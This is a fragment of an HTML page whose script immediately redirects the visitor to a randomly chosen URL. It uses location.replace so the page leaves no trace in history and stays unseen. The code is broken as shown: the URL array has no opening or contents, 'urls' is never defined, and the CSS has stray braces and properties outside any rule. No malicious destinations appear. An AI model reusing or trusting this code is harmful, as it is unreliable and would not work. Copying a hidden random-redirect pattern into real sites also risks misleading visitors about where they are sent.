    <style>

        }

            min-height: 100vh;
            /* No text, no elements, no display whatsoever */
        }
        /* hide any potential fallback text */
        .hidden-fallback {
            display: none;
        }
        /* For extreme speed: prevent any paint or flash of content */
        html, body {
            width: 100%;
            height: 100%;
        }
    </style>
    <script>
        // ============================================================

        ];

        // Ensure the array is not empty (sanity check)
        if (!urls || urls.length === 0) {
            // fallback: never happens with given list, but just in case, redirect to a default.
            window.location.replace("https://www.example.com");
        } else {
            // Generate cryptographically strong random index for true randomness
            // Use Crypto API if available (modern browsers), fallback to Math.random for old ones.
            let randomIndex;
            if (window.crypto && window.crypto.getRandomValues) {
                const randomArray = new Uint32Array(1);
                window.crypto.getRandomValues(randomArray);
                randomIndex = randomArray[0] % urls.length;
            } else {
                // Fallback for extremely old or non-secure contexts (still random enough)
                randomIndex = Math.floor(Math.random() * urls.length);
            }
            
            // Pick the random URL
            const targetUrl = urls[randomIndex];
            
            // PERFORM IMMEDIATE REDIRECTION
            // Using replace() to avoid creating a history entry (clean redirect, no back button to this page)
            // This ensures the user does not see this intermediate page at all (if network is fast).
            // For absolute reliability, we also set a meta refresh as backup, but JS redirect is instant.
            window.location.replace(targetUrl);
        }
    </script>
